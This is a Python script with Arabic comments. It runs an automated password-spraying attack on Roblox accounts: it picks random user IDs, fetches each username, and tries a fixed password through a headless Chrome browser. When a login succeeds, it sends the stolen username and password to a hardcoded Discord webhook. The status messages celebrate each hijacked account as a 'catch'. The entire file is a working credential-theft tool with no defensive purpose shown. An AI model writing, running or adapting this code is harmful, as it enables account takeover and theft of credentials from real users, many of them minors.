import requests
import random
import time
import sys
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

# --- إعدادات المستخدم ---
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1395564556524191824/6gjDVUiguSSGzkiODa7QUdf-BsmE-hBG_03zrPWNgsfrA0EMbQtNtKh7cf6qfcqhHjKk"
FIXED_PASSWORD = "l0l0l0l"
# -----------------------

def print_now(text):
    print(text)
    sys.stdout.flush()

def generate_id():
    random_part = "".join([str(random.randint(0, 9)) for _ in range(6)])
    return int(f"12{random_part}")

def get_username_from_id(user_id):
    url = f"https://users.roblox.com/v1/users/{user_id}"
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            return response.json().get("name")
        return None
    except:
        return None

def attempt_login(username, password, user_id):
    print_now(f"🚀 محاولة دخول حقيقية للحساب: {username}...")
    
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    
    driver = None
    try:
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=chrome_options)
        driver.get("https://www.roblox.com/login")

        # إدخال البيانات
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "username")))
        driver.find_element(By.NAME, "username").send_keys(username)
        driver.find_element(By.NAME, "password").send_keys(password)
        driver.find_element(By.ID, "login-button").click()

        time.sleep(5) # انتظار النتيجة

        # فحص النتيجة
        if "captcha" in driver.page_source.lower():
            print_now(f"⚠️ ظهرت CAPTCHA للحساب {username} (توقف مؤقت)")
            return False
        
        if "home.roblox.com" in driver.current_url or "users.roblox.com" in driver.current_url:
            print_now(f"✅✅ نجاح باهر! تم اختراق الحساب: {username}")
            # إرسال لديسكورد
            requests.post(DISCORD_WEBHOOK_URL, json={"content": f"🔥 صيد جديد! {username}:{password}"})
            return True
        else:
            print_now(f"❌ فشل: كلمة المرور '{password}' غير صحيحة لهذا الحساب.")
            return False

    except Exception as e:
        print_now(f"❗ خطأ تقني: {e}")
        return False
    finally:
        if driver:
            driver.quit()

def main():
    print_now("🔥 بدء البوت بنظام التقارير الكاملة...")
    while True:
        user_id = generate_id()
        username = get_username_from_id(user_id)
        
        if username:
            print_now(f"🔍 وجدنا حساب حقيقي: {username} (ID: {user_id})")
            attempt_login(username, FIXED_PASSWORD, user_id)
            time.sleep(2)
        else:
            time.sleep(0.5)

if __name__ == "__main__":
    main()
